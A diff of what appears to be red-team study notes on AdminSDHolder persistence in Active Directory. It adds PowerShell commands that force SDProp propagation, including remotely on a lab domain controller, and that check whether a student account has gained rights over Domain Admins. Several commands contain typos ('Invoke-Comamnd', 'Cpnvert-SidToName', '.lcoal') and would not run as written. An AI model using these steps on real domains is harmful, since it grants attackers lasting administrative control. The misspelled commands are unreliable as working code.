@@ -37,12 +37,37 @@ Use tool called [RACE ](https://github.com/samratashok/RACE)to add the privilege
 
 Run SDProp mannually. If GUI access is availabe, the above privileges can be added easily through GUI.
 
+## Propagate Manually
+
 ```powershell
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 
 # pre-Server 2008 machines
 Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
 ```
+
+```powershell
+# OR it can be used like below
+$sess = New-PSSession -Computername dcorp-dc
+Invoke-Comamnd -Session $sess -FilePath C:\AD\Tools\Invoke-SDPropagator.ps1
+Invoke-Command -ScriptBlock{Invoke-SDPropagator -showProgress -Verbose -timeoutMinutes 1} -Session $sess
+```
+
+### Verify Propagation
+
+{% tabs %}
+{% tab title="PowerView" %}
+```powershell
+Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | For-Each-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Cpnvert-SidToName $_.SecurityIdentifier);$_)} | ?{$_.IdentityName -match "studentxx"}
+```
+{% endtab %}
+
+{% tab title="AD Module" %}
+```powershell
+(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=lcoal').Access | ?{$_.IdentityReference -match 'studentxx'}
+```
+{% endtab %}
+{% endtabs %}
 
 ## Abusing rights
 
